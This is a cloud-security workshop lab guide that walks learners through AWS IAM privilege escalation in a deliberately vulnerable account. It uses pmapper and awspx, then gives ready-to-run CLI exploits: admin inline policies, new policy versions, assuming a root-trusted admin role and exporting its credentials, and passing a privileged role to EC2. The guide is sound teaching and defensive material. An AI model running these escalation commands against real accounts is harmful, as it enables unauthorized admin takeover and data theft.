# Lab 1 - Layin' Down the Law: Identifying and Exploiting IAM Misconfigurations

**Duration:** 45 minutes

## Overview

In this lab, you'll use open source tools to discover and exploit privilege escalation vulnerabilities in AWS IAM. This hands-on experience demonstrates why IAM misconfigurations are consistently ranked among the top cloud security risks.

**What You'll Learn:**
- IAM privilege escalation strategies and what makes them possible
- How attackers use tools like **pmapper** to automatically discover IAM vulnerabilities
- How to visualize IAM relationships using **awspx**
- How to exploit six distinct privilege escalation paths—each with a **different root cause**

---

## Environment Set Up

## Step 1: Configure AWS Credentials

Paste the `export` commands provided by the workshop facilitator into your terminal session:

```bash
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
```

Verify the credentials are working:

```bash
aws sts get-caller-identity
```

Expected output looks similar to the following:

```
{
    "UserId": "<Your user id>",
    "Account": "<your account id>",
    "Arn": "<your identity arn>"
}
```

---

## Step 2: Clone the Workshop Repository

```bash
git clone https://github.com/TaraScho/ws-wrangling-identity-and-access-in-aws.git ~/workshop
cd ~/workshop
```

---

## Step 3: Run the Setup Script

```bash
bash labs/wwhf-setup.sh
```

The script will:

1. Verify prerequisites (Docker, Python 3, AWS credentials, etc.)
1. Install Terraform and pmapper
1. Create the awspx credential wrapper
1. Add tools to your PATH
1. Deploy the vulnerable lab infrastructure with Terraform
1. Configure AWS CLI profiles for all 6 exercise users

When the script finishes, you should see:

```
=== Setup Complete! (4/4 checks passed) ===

You're ready to start Lab 1. Happy hacking!
```
---

## Privilege Escalation Categories

Throughout this workshop, we will reference [pathfinding.cloud](https://pathfinding.cloud), an open source knowledge store dedicated to understanding, detecting & demonstrating AWS IAM Privilege Escalation. We'll start by exploring the Privilege Escalation Library and understanding the categories used to 

1. Navigate to [pathfinding.cloud](https://pathfinding.cloud) in your browser.

1. Open the **Privilege Escalation Library**.

1. Note the drop-down menu to filter by **CATEGORY**. As of writing these instructions, pathfinding.cloud organizes privilege escalation paths into five categories.

| Category              | Description                                 |
|-----------------------|---------------------------------------------|
| **Self-Escalation**   | Modify your own permissions directly to escalate privileges
| **Principal Access**  | Gain access to a different principal to escalate privileges       |
| **New PassRole**      | Create a new resource (EC2, Lambda, etc.) and pass a privileged role to it |
| **Existing PassRole** | Modify an existing resource with an attached role and gain access to that role     |
| **Credential Access** | Access to hardcoded credentials stored insecurely        |

In this lab, you'll exploit vulnerabilities from several of these categories.

Take a moment to explore the different categories in pathfinding.cloud. You can click on each path to see a description and attack visualization. 

---

## Exercise 1: Building Your IAM Intelligence

Now that you are familiar with general privilege escalation techniques, it's time to find find out what IAM vulnerabilities exist in your lab AWS account. You will use two open source pentesting tools to do reconnaissance on the lab AWS account and find the juciest IAM vulnerabilities to exploit.

- **pmapper** (Principal Mapper): Builds a graph of IAM principals and analyzes privilege escalation paths
- **awspx**: Visualizes IAM relationships as an interactive graph and is a great tool for high-level review of effective access paths between users, roles, and resources.

> [!NOTE]
> In addition to the tools you will use in this lab, there are several well known AWS pentesting tools useful for IAM privilege escalation. The **OSS DETECTION** field on pathfinding.cloud shows you which existing open source tools can detect a given attack path.

### Part A: Create the pmapper Graph

pmapper works by first building a "graph" of your AWS account's IAM configuration. This graph captures all users, roles, groups, and their permissions.

> [!NOTE]
> **What permissions does pmapper need?** pmapper makes read-only AWS API calls to build its graph — `iam:List*` and `iam:Get*` actions across users, roles, groups, and policies. It also calls `sts:GetCallerIdentity` and checks for Organizations SCPs. The AWS managed policy **ReadOnlyAccess** is sufficient. pmapper never modifies your account — it only reads configuration data to build a local graph model.

1. **Create the IAM graph:**
   ```bash
   pmapper graph create --include-regions us-east-1 us-east-2 us-west-1 us-west-2
   ```

   Example output (partial):

   ```
    2026-02-06 18:45:12-0700 | Sorting users, roles, groups, policies, and their relationships.
    2026-02-06 18:45:12-0700 | Obtaining Access Keys data for IAM users
    2026-02-06 18:45:13-0700 | Gathering MFA virtual device information
    2026-02-06 18:45:13-0700 | Gathering MFA physical device information
    2026-02-06 18:45:13-0700 | Determining which principals have administrative privileges
    2026-02-06 18:45:13-0700 | Initiating edge checks.
    2026-02-06 18:45:13-0700 | Generating Edges based on EC2 Auto Scaling.
    ```

   This command:
   - Enumerates all IAM users, roles, and groups
   - Retrieves all attached and inline policies
   - Analyzes trust relationships between principals
   - Takes 1-2 minutes to complete

   `pmapper graph create` saves a serialized graph data store to a platform-specific directory such as `~/.local/share/principalmapper` on Linux
   
   When it finishes running you will see a summary similar to the following:

    ```
    Graph Data for Account:  <account ID>
    # of Nodes:              45 (11 admins)
    # of Edges:              38
    # of Groups:             2
    # of (tracked) Policies: 52
    ```

    You can redisplay this graph summary any time with 

    ```
    pmapper graph display
    ```

   In the example above `11 admins` tells you how many principals have administrative access—these are high-value targets for attackers.

### Part B: Run Privilege Escalation Analysis

Now use pmapper to automatically find privilege escalation paths:

```bash
pmapper analysis --output-type text
```

**What to look for:** Scan the output for users starting with `iamws-`. These are the intentionally vulnerable principals we'll explore. The following are a few examples of what you will see in the pmapper output.

```
* user/iamws-ci-runner-user can escalate privileges by accessing the
  administrative principal role/iamws-prod-deploy-role:
   * user/iamws-ci-runner-user can use EC2 to run an instance with an
     existing instance profile to access role/iamws-prod-deploy-role

* user/iamws-role-assumer-user can escalate privileges by accessing
  the administrative principal role/iamws-privileged-admin-role:
   * user/iamws-role-assumer-user can access via sts:AssumeRole
     role/iamws-privileged-admin-role

* user/iamws-lambda-developer-user can escalate privileges by accessing
  the administrative principal role/iamws-privileged-lambda-role:
   * user/iamws-lambda-developer-user can use Lambda to edit an existing
     function to access role/iamws-privileged-lambda-role
```

**Key insight:** pmapper automatically identified that low-privilege users can reach administrative principals. An attacker with access to any of these users could compromise the entire account.

### Part C: Load Data into awspx

awspx also provides a visual way to explore IAM relationships. awspx renders an **interactive graph** so you can visually trace how users, roles, groups, and policies connect—and where attack paths exist. It's already running at [http://localhost](http://localhost).

1. **Ingest AWS IAM data:**
   ```bash
   awspx ingest --env --services IAM --region us-east-1
   ```

   Similar to pmapper, this command pulls IAM data into awspx's graph database (Neo4j).

1. **Open awspx** in your browser at [http://localhost](http://localhost)

   You'll see an empty canvas with a **search bar** at the bottom and a **toolbar** on the right side.

1. **Visualize the privesc path:** pmapper already told you that `iamws-group-admin-user` can escalate to admin. Now let's use awspx **Advanced Search**, which finds paths between any two resources in the graph.

   a. Click the **filter icon** (the sliders icon to the right of the search bar) to open the **Advanced Search** panel. You'll see **From** and **To** fields, a **Mode** section, and a query editor at the bottom.

   b. Click into the **From** field and type `iamws-group-admin-user`. A dropdown appears — you'll see several similarly-named resources (`iamws-group-admin-policy`, `iamws-group-admin-role`, `iamws-group-admin-user`). Make sure you select the **user** — the one ending in `-user`.

   c. Click into the **To** field and type `Effective Admin`. Select it from the dropdown.

      **What is "Effective Admin"?** This is a pseudo-node that awspx creates automatically during data ingestion. It represents the goal of a privilege escalation attack: full administrative access (`Action: *, Resource: *`).

   d. Look at the query editor at the bottom of the panel. awspx auto-generated a [Cypher](https://neo4j.com/docs/cypher-manual/current/introduction/) query:
      ```
      MATCH Paths=ShortestPath((Source)-[:TRANSITIVE|ATTACK*0..]->(Target))
      WHERE ID(Source) IN [<your node ID>]
      AND ID(Target) IN [<your node ID>]
      RETURN Paths LIMIT 500
      ```

      You don't need to understand Cypher syntax to use awspx, but the key part is `TRANSITIVE|ATTACK` — this tells awspx to follow both **transitive edges** (IAM relationships like "user is member of group" or "policy is attached to role") *and* **attack edges** (computed privilege escalation paths) when searching for a route between the two nodes.

   e. Click the **Run** button (▶) at the bottom-right of the Advanced Search panel.

1. **See the attack path:**

   The result renders behind the Advanced Search panel. Click anywhere on the canvas background to dismiss the search panel and reveal the graph.

   You should now see two nodes connected by a **maroon dashed edge**:

   - **`iamws-group-admin-user`** (red person icon) — the source principal (IAM user)
   - **`Effective Admin`** (crown icon) — the target representing full administrative access
   - A **maroon dashed line** connecting them — an **attack edge**

   awspx displays three types of edges in its graph. You're looking at one now — understanding all three will help you read the graphs throughout this lab:

   - **Transitive edges** (solid lines) — IAM relationships that connect resources: group membership, policy attachment, role trust. These are the "plumbing" of IAM.
   - **Action edges** (labeled gradient-colored lines) — Individual resolved IAM permissions, like `s3:GetObject` or `iam:PutGroupPolicy`. These show what a principal is allowed to *do*.
   - **Attack edges** (maroon dashed lines) — Computed privilege escalation paths. awspx analyzes the transitive edges and action edges together and determines that a principal can chain permissions to escalate privileges. The attack edge you see now means awspx has found a viable escalation path from this user to full admin.

1. **Explore the node**

   Before we look at the attack itself, let's orient ourselves with the tool. Click on the **`iamws-group-admin-user`** node. A properties panel opens at the top of the screen with several tabs. Click through each one:

   - **AWS::Iam::User** — Basic identity info: the user's name, ARN, creation date, and IAM ID.
   - **AccessKeys** — Any access keys associated with this user.
   - **GroupList** — The IAM groups this user belongs to. You should see **`iamws-dev-team`** listed here. 
   - **Notes** — An working area for you to add any notes you want to keep about this principal

   Now click anywhere on the canvas background to dismiss the panel.

1. **Explore IAM relationships — right-click the node:**

   Right-click on the **`iamws-group-admin-user`** node. A context menu appears with four buttons around the node. Hover over each button to see what it is.

   - **Outbound Paths** — transitive and attack edges going *from* this node
   - **Outbound Actions** — specific IAM permissions this principal has
   - **Inbound Paths** — transitive and attack edges coming *to* this node
   - **Inbound Actions** — specific IAM permissions targeting this principal

   Click **Outbound Paths**. The graph expands to show the resources connected to this user:

   - **`iamws-group-admin-policy`** (policy icon) — connected by a solid **transitive edge** labeled "Attached". This is the IAM policy attached to the user that grants the `iam:PutGroupPolicy` permission.
   - **`iamws-dev-team`** (group icon) — connected by a solid **transitive edge** labeled "Attached". This is the IAM group the user belongs to — and the target the attacker will write an admin policy on.
   - **`Effective Admin`** (crown icon) — connected by the maroon dashed **attack edge** labeled "PutGroupPolicy".

   Now you can see the complete story: the user has a policy granting `PutGroupPolicy`, they belong to `iamws-dev-team`, and awspx has determined they can exploit that combination to reach admin. The transitive edges show *how IAM resources are connected*, and the attack edge shows *what an attacker can do with those connections*.

   Click anywhere on the canvas to dismiss any open panels before continuing.

1. **Discover the exploit — click the attack edge:**

   Click directly on the **maroon dashed line** (the attack edge) between the two nodes. A panel opens at the top-left with two tabs: **Attack Path** and **Notes**.

   The **Attack Path** tab shows you the exact exploitation command:
   ```bash
   aws iam put-group-policy \
     --group-name iamws-dev-team \
     --policy-name Admin \
     --policy-document file://<(cat <<EOF
   {
       "Version": "2012-10-17",
       "Statement": [
           {
               "Sid": "Admin",
               "Effect": "Allow",
               "Action": "*",
               "Resource": "*"
           }]
   }
   EOF
   )
   ```

   awspx is telling you that `iamws-group-admin-user` can call `iam:PutGroupPolicy` to write an inline admin policy on the group `iamws-dev-team`. Since this user is a *member* of that group, the new policy immediately grants them full admin access.

   This is the entire attack plan — laid out by a tool, from a single graph query. Now you are ready to escalate privileges.

**The exercise pattern:** For each of the remaining exercises, you'll follow the same workflow: **(1)** visualize the attack path in awspx, **(2)** confirm the vulnerability with pmapper, **(3)** review the attack conceptually on pathfinding.cloud, and **(4)** exploit it. You've already completed the awspx visualization for the next excercise, so the instructions will jump straight to pmapper.

> **NOTE:**
> Most excercises have instructions for both awspx and pmapper, which is in many cases redundant, but will familiarize you with both tools. Feel free to focus on one tool if you prefer.
>
> Some

## Exercise 2: PutGroupPolicy - Self-Escalation via Groups

**Category:** Self-Escalation
**Starting point identity:** `iamws-group-admin-user`

**The Vulnerability:** The `iamws-group-admin-user` has `iam:PutGroupPolicy` with `Resource: "*"`, allowing them to write arbitrary inline policies on ANY IAM group. Since they're a member of `iamws-dev-team`, they can write an admin policy on that group—immediately granting themselves full access.

### Part A: Query permissions with pmapper

pmapper can answer specific questions about what principals can and can't do. In your terminal, try the following query.

```bash
pmapper query "can user/iamws-group-admin-user do iam:PutGroupPolicy with *"
```

Expected output:
```
user/iamws-group-admin-user IS authorized to call action
iam:PutGroupPolicy for resource *
```

**What this means:** The user can write inline policies on ANY group—including groups they belong to. 

### Part B: Understand the Attack Conceptually 

Visit [pathfinding.cloud IAM-011](https://pathfinding.cloud/paths/iam-011) to explore and learn more about this type of path.

### Part C: Exploit the Vulnerability

> [!TIP]
> The `--profile` flag tells the AWS CLI to use a specific named profile's credentials for that single command, without affecting your shell environment. Each exercise uses a different profile to act as the attacker.

**Step 1: Verify your attacker identity**
```bash
aws sts get-caller-identity --profile iamws-group-admin-user
```

You should see you're now operating as `iamws-group-admin-user`.

**Step 2: Try to access the crown jewels**

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text \
  --profile iamws-group-admin-user)

aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-group-admin-user
```

**Expected:** `AccessDenied` — this low-privilege user can't reach the crown jewels... yet.

**Step 3: Check which groups your user is part of**

### Check which groups the attacker belongs to
```
aws iam list-groups-for-user --user-name iamws-group-admin-user \
  --query 'Groups[].GroupName' --output table \
  --profile iamws-group-admin-user
```

You'll see the user is a member of `iamws-dev-team`.

**Step 4: View the current benign inline policy**
```bash
# List inline policies on the group
aws iam list-group-policies --group-name iamws-dev-team \
  --profile iamws-group-admin-user

# Read the current policy (read-only permissions)
aws iam get-group-policy \
  --group-name iamws-dev-team \
  --policy-name iamws-dev-team-readonly \
  --query 'PolicyDocument' --output json \
  --profile iamws-group-admin-user
```

Note the limited permissions (EC2 read-only).

**Step 5: Write an admin inline policy on the group**
```bash
aws iam put-group-policy \
  --group-name iamws-dev-team \
  --policy-name iamws-dev-team-escalated \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }]
  }' \
  --profile iamws-group-admin-user
```

**Step 6: Verify the escalation — claim the crown jewels**
```bash
# Now grab the crown jewels
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-group-admin-user
```

**You just escalated a group admin to full administrator** by writing an inline policy on a group you belong to. The crown jewels are yours — every member of `iamws-dev-team` is now also an admin.

### Explore on Your Own

Before continuing, take a moment to explore other attack paths in awspx. Close any open panels by clicking on the canvas, then click the **Clear the screen** button (monitor icon) in the right toolbar to clear the graph. Open Advanced Search again and try querying other `iamws-` users (like `iamws-ci-runner-user` or `iamws-role-assumer-user`) in the **From** field with `Effective Admin` in the **To** field. Each user reaches admin through a *different* attack edge — click the maroon dashed line on each to see the different exploitation techniques. This is the variety of vulnerabilities you'll exploit in the upcoming exercises.

> [!TIP]
> The main search bar at the bottom also lets you add individual resources to the canvas by name — useful for exploring how a specific user, role, or policy connects to the rest of the graph. Try adding a few `iamws-` resources to see their icons and labels.

---

## Exercise 3: CreatePolicyVersion - Self-Escalation

**Category:** Self-Escalation
**Starting Identity:** `iamws-policy-developer-user`

**The Vulnerability:** The `iamws-policy-developer-user` can create new versions of IAM policies—including a policy that's attached to themselves. By creating a new version with administrator permissions and setting it as default, they escalate their own privileges.

**Real-world scenario:** A developer is given permission to manage "development" policies for their team. Without proper constraints, they can modify ANY policy—including ones attached to their own user, effectively granting themselves any permission they want.

### Visualize in awspx

Open **Advanced Search** in awspx. Set **From** to `iamws-policy-developer-user` and **To** to `Effective Admin`, then click **Run** (▶). You should see a maroon dashed attack edge labeled **`CreatePolicyVersion`** — awspx has identified that this user can modify a policy attached to themselves to reach admin.

> **NOTE**
> Make sure to click **Run** (▶) to run your new query, or you will still see the graph from the previous excercise.

### Part A: Identify with pmapper

First, confirm this user has the dangerous permission:

```bash
pmapper query "can user/iamws-policy-developer-user do iam:CreatePolicyVersion with *"
```

Expected output:
```
user/iamws-policy-developer-user IS authorized to call action
iam:CreatePolicyVersion for resource *
```

**What this means:** The user can create new versions of ANY policy. The `*` wildcard is part of the problem—but even restricting the Resource wouldn't fully fix it if they can still modify policies attached to themselves.

### Part B: Understand the Attack Category

Visit [pathfinding.cloud IAM-001](https://pathfinding.cloud/paths/iam-001) to understand this attack path:

- **Category:** Self-Escalation
- **Required Permission:** `iam:CreatePolicyVersion` (or `iam:SetDefaultPolicyVersion`)
- **Attack:** Create a new policy version with admin permissions, set as default
- **Impact:** Immediate full account access

### Part C: Exploit the Vulnerability

Now let's prove this vulnerability is exploitable.

**Step 1: Verify your attacker identity**
```bash
aws sts get-caller-identity --profile iamws-policy-developer-user
```

You should see you're now operating as `iamws-policy-developer-user`.

**Step 2: Try to access the crown jewels**

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text \
  --profile iamws-policy-developer-user)

aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-policy-developer-user
```

**Expected:** `AccessDenied` — this developer can't reach the crown jewels... yet.

**Step 3: Identify the policy attached to this user**
```bash
# Store the account ID (already set above)
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text \
  --profile iamws-policy-developer-user)

# The developer-tools-policy is attached to this user
POLICY_ARN="arn:aws:iam::${ACCOUNT_ID}:policy/iamws-developer-tools-policy"

# View the current policy
aws iam get-policy-version \
  --policy-arn $POLICY_ARN \
  --version-id v1 \
  --query 'PolicyVersion.Document' \
  --output json \
  --profile iamws-policy-developer-user
```

Note the limited permissions (EC2 read-only).

**Step 4: Create a new version of the policy with admin permissions**
```bash
aws iam create-policy-version \
  --policy-arn $POLICY_ARN \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }]
  }' \
  --set-as-default \
  --profile iamws-policy-developer-user
```

**Step 5: Verify the escalation — claim the crown jewels**
```bash
# Now grab the crown jewels
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-policy-developer-user
```

**You just escalated a low-privilege developer to full administrator** by modifying a policy attached to yourself. The crown jewels are yours.

### What You Learned

- **iam:CreatePolicyVersion** allows modifying any policy, including ones attached to self
- The root cause is the ability to modify a policy that grants YOUR OWN permissions

---

## Exercise 4: AssumeRole - Principal Access via Permissive Trust

**Category:** Principal Access
**Starting AWS Identity:** `iamws-role-assumer-user`
**Target:** `iamws-privileged-admin-role`

**The Vulnerability:** The `iamws-privileged-admin-role` has an overly permissive trust policy—it trusts the entire AWS account (`:root`). Any principal in the account with `sts:AssumeRole` permission can assume this admin role.

**Real-world scenario:** An administrator creates a privileged role and sets the trust policy to the account root, thinking "this restricts it to one root user." But account root trust means ANY principal in the account with AssumeRole permission can become this role.

### Visualize in awspx

Open **Advanced Search** in awspx. Set **From** to `iamws-role-assumer-user` and **To** to `Effective Admin`, then click **Run** (▶). You should see a maroon dashed attack edge labeled **`AssumeRole`** — awspx has identified that this user can assume a privileged role to reach admin.

### Part A: Identify with pmapper

```bash
pmapper query "can user/iamws-role-assumer-user do sts:AssumeRole with arn:aws:iam::*:role/iamws-privileged-admin-role"
```

Expected output:
```
user/iamws-role-assumer-user IS authorized to call action
sts:AssumeRole for resource arn:aws:iam::*:role/iamws-privileged-admin-role
```

### Part B: Understand the Attack Category

Visit [pathfinding.cloud STS-001](https://pathfinding.cloud/paths/sts-001) to understand this attack path:

- **Category:** Principal Access
- **Required Permission:** `sts:AssumeRole` + permissive trust policy on target
- **Root Cause:** Trust policy trusts account root instead of specific principals
- **Impact:** Access to any role with permissive trust

**Key insight:** The vulnerability is NOT in the attacker's `sts:AssumeRole` permission—it's in the TARGET role's trust policy. The trust policy is a **resource policy** that controls who can assume the role.

### Part C: Examine the Trust Policy

First, look at the vulnerable trust policy:

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)

aws iam get-role --role-name iamws-privileged-admin-role \
  --query 'Role.AssumeRolePolicyDocument' --output json
```

You'll see:
```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": { "AWS": "arn:aws:iam::ACCOUNT_ID:root" },
    "Action": "sts:AssumeRole"
  }]
}
```

**The problem:** `:root` means "any principal in this account"—not "the root user."

### Part D: Exploit the Vulnerability

**Step 1: Verify your low-privilege identity**
```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text \
  --profile iamws-role-assumer-user)
aws sts get-caller-identity --profile iamws-role-assumer-user
```

You should see you're now operating as `iamws-role-assumer-user`.

**Step 2: Try to access the crown jewels**

```bash
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-role-assumer-user
```

**Expected:** `AccessDenied` — this user can't reach the crown jewels... yet.

**Step 3: Assume the privileged admin role**

This is the exploit — the user's `sts:AssumeRole` permission combined with the permissive trust policy allows assuming the admin role:

```bash
ADMIN_CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/iamws-privileged-admin-role \
  --role-session-name escalated \
  --query "Credentials" \
  --output json \
  --profile iamws-role-assumer-user)

export AWS_ACCESS_KEY_ID=$(echo $ADMIN_CREDS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $ADMIN_CREDS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $ADMIN_CREDS | jq -r '.SessionToken')
```

**Step 4: Verify escalation — claim the crown jewels**
```bash
aws sts get-caller-identity

# Now grab the crown jewels with the escalated role credentials
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt -
```

You should see `iamws-privileged-admin-role` in the ARN and the crown jewels file contents. You now have `AdministratorAccess`.

### Cleanup

```bash
# Unset the escalated role credentials
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN

# Verify you're back to your original identity
aws sts get-caller-identity
```

### What You Learned

- Trust policies using `:root` trust the entire account, not just the root user
- The vulnerability is in the **resource policy** (trust policy), attached to the IAM role

---

## Exercise 5: PassRole + EC2 - New PassRole

**Category:** New PassRole
**Starting AWS identity:** `iamws-ci-runner-user`
**Target:** `iamws-prod-deploy-role` (via EC2 instance)

> [!NOTE]
> **New to EC2 and PassRole?** Here's a quick primer:
> - **EC2 instance** = a virtual machine running in the cloud. 
> - **Instance profile** = the mechanism for attaching an IAM role to an EC2 instance. The instance can then retrieve temporary credentials for that role from the [instance metadata service](http://169.254.169.254). This exists so workloads running on your EC2 instances (and other compute in AWS) can use these credentials to access other cloud services like your storage or databases
> - **`iam:PassRole`** = the permission that controls which IAM roles a user can hand off ("pass") to an AWS service. You don't *become* the role — you tell a service like EC2 or Lambda to *use* it. PassRole is the gatekeeper for that handoff.

**The Vulnerability:** The `iamws-ci-runner-user` has `iam:PassRole` intended for Lambda deployments, but the permission is missing the `iam:PassedToService` condition key. Without this condition, PassRole works for *any* AWS service — including EC2. 

**Real-world scenario:** A CI/CD pipeline user needs `iam:PassRole` to deploy Lambda functions and has separate EC2 permissions for build infrastructure. Without the `iam:PassedToService` condition, PassRole isn't scoped to Lambda — it works for all services. The attacker exploits this gap by passing a privileged role to EC2 instead.

### Part A: Identify with pmapper

```bash
pmapper query "can user/iamws-ci-runner-user do iam:PassRole with *"
```

Expected output:
```
user/iamws-ci-runner-user IS authorized to call action iam:PassRole for resource *
```

Also check the escalation path:
```bash
pmapper analysis --output-type text | grep -A2 "iamws-ci-runner-user"
```

### Part B: Understand the Attack Category

Visit [pathfinding.cloud EC2-001](https://pathfinding.cloud/paths/ec2-001):

- **Category:** New PassRole
- **Required Permissions:** `iam:PassRole` + `ec2:RunInstances` (unrestricted)
- **Root Cause:** Missing `iam:PassedToService` condition key
- **Impact:** Access to any role that has an instance profile

PassRole attacks are indirect—the attacker doesn't directly become the role, they pass it to a compute service that exposes the credentials.

### Part C: Examine the Vulnerable Policy

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)

aws iam get-policy-version \
  --policy-arn arn:aws:iam::${ACCOUNT_ID}:policy/iamws-ci-runner-policy \
  --version-id v1 \
  --query 'PolicyVersion.Document' \
  --output json
```

Notice the PassRole statement has `Resource: "*"` but **no Condition block**. Since this user's PassRole is intended for Lambda deployments, the missing condition is:
```json
"Condition": {
  "StringEquals": {
    "iam:PassedToService": "lambda.amazonaws.com"
  }
}
```

With this condition, PassRole would only work when handing a role to Lambda — the EC2 attack path would be completely blocked.

### Part D: Exploit the Vulnerability

**Step 1: Try to access the crown jewels**

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text \
  --profile iamws-ci-runner-user)

aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-ci-runner-user
```

**Expected:** `AccessDenied` — this CI runner can't reach the crown jewels... yet.

**Step 2: Find privileged instance profiles**
```bash
aws iam list-instance-profiles \
  --query 'InstanceProfiles[].{Name:InstanceProfileName,Roles:Roles[].RoleName}' \
  --output table \
  --profile iamws-ci-runner-user
```

You'll see `iamws-prod-deploy-profile` with role `iamws-prod-deploy-role` (which has `*:*` permissions). This is our target.

**Step 3: Find a suitable AMI and subnet**

We need an Amazon Linux 2 AMI (which has the SSM agent pre-installed) and a subnet to launch into:

```bash
# Get the latest Amazon Linux 2 AMI
AMI_ID=$(aws ec2 describe-images \
  --owners amazon \
  --filters "Name=name,Values=amzn2-ami-hvm-*-x86_64-gp2" \
            "Name=state,Values=available" \
  --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' \
  --output text \
  --profile iamws-ci-runner-user)

echo "AMI: $AMI_ID"

# Get the default VPC's first subnet
SUBNET_ID=$(aws ec2 describe-subnets \
  --filters "Name=default-for-az,Values=true" \
  --query 'Subnets[0].SubnetId' \
  --output text \
  --profile iamws-ci-runner-user)

echo "Subnet: $SUBNET_ID"
```

**Step 4: Launch EC2 with the privileged instance profile**

This is the vulnerability proven — unrestricted `iam:PassRole` allows attaching an admin role to a new EC2:

```bash
INSTANCE_ID=$(aws ec2 run-instances \
  --image-id $AMI_ID \
  --instance-type t2.micro \
  --iam-instance-profile Name=iamws-prod-deploy-profile \
  --subnet-id $SUBNET_ID \
  --query 'Instances[0].InstanceId' \
  --output text \
  --profile iamws-ci-runner-user)

echo "Launched instance: $INSTANCE_ID"
```

**Step 5: Wait for the instance and SSM agent to come online**

The instance needs ~60-90 seconds to boot and register with SSM:

```bash
echo "Waiting for instance to reach running state..."
aws ec2 wait instance-running --instance-ids $INSTANCE_ID \
  --profile iamws-ci-runner-user

echo "Waiting for SSM agent to register (this may take up to 90 seconds)..."
for i in $(seq 1 30); do
  SSM_STATUS=$(aws ssm describe-instance-information \
    --filters "Key=InstanceIds,Values=$INSTANCE_ID" \
    --query 'InstanceInformationList[0].PingStatus' \
    --output text \
    --profile iamws-ci-runner-user 2>/dev/null)
  if [ "$SSM_STATUS" = "Online" ]; then
    echo "SSM agent is online!"
    break
  fi
  echo "  Attempt $i/30 - SSM status: ${SSM_STATUS:-not yet registered}"
  sleep 5
done
```

**Step 6: Start an interactive SSM session and claim the crown jewels**

```bash
aws ssm start-session --target $INSTANCE_ID \
  --profile iamws-ci-runner-user
```

Once inside the session, run the following commands to prove you have admin access via the instance's role:

```bash
# Inside the SSM session:
# Prove admin access
aws sts get-caller-identity

# Grab the crown jewels from inside the EC2 instance
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt -
```

You should see the caller identity shows `iamws-prod-deploy-role` and the crown jewels file contents — you now have full admin access from inside the EC2 instance.

**Step 7: Exit the session**
```bash
exit
```

### What You Learned

- **iam:PassRole** controls which roles can be handed off to AWS services like EC2 and Lambda
- The missing `iam:PassedToService` condition is the root cause — PassRole was intended for Lambda, but without the condition it worked for EC2 too
- Unrestricted PassRole + compute permissions = credential access to any role with an instance profile
- **Remediation preview:** In Lab 2, you'll add `iam:PassedToService: lambda.amazonaws.com` to scope PassRole to its intended service, completely blocking the EC2 attack path

---

## Exercise 6: UpdateFunctionCode - Existing PassRole

**Category:** Existing PassRole
**Starting IAM Principal:** `iamws-lambda-developer-user`
**Target:** `iamws-privileged-lambda` (with `iamws-privileged-lambda-role`)

**The Vulnerability:** The `iamws-lambda-developer-user` can update the code of ANY Lambda function—including functions that have privileged execution roles. By replacing the code with a malicious payload, they can exfiltrate the Lambda's credentials.

**Real-world scenario:** A developer can deploy code to Lambda functions but shouldn't be able to access production resources. If they can modify ANY Lambda (not just their own), they can target Lambdas with privileged roles.

### Part A: Identify with pmapper

```bash
pmapper query "can user/iamws-lambda-developer-user do lambda:UpdateFunctionCode with *"
```

Check the escalation path:
```bash
pmapper analysis --output-type text | grep -A2 "iamws-lambda-developer-user"
```

Expected output:
```
* user/iamws-lambda-developer-user can escalate privileges by accessing
  the administrative principal role/iamws-privileged-lambda-role:
   * user/iamws-lambda-developer-user can use Lambda to edit an existing
     function (arn:aws:lambda:...:function:iamws-privileged-lambda)
```

### Part B: Understand the Attack Category

Visit [pathfinding.cloud Lambda-003](https://pathfinding.cloud/paths/lambda-003):

- **Category:** Existing PassRole
- **Required Permission:** `lambda:UpdateFunctionCode` (unrestricted)
- **Root Cause:** Can modify ANY Lambda, not just designated ones
- **Impact:** Access to any Lambda's execution role

Unlike "New PassRole" where you CREATE new compute, "Existing PassRole" exploits EXISTING compute that already has a role attached.

### Part C: Exploit the Vulnerability

**Step 1: Try to access the crown jewels**

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text \
  --profile iamws-lambda-developer-user)

aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-lambda-developer-user
```

**Expected:** `AccessDenied` — this Lambda developer can't reach the crown jewels... yet.

**Step 2: Find the privileged Lambda**
```bash
aws lambda list-functions \
  --query 'Functions[?starts_with(FunctionName, `iamws`)].{Name:FunctionName,Role:Role}' \
  --output table \
  --profile iamws-lambda-developer-user
```

You'll see `iamws-privileged-lambda` with role `iamws-privileged-lambda-role` (which has `AdministratorAccess`).

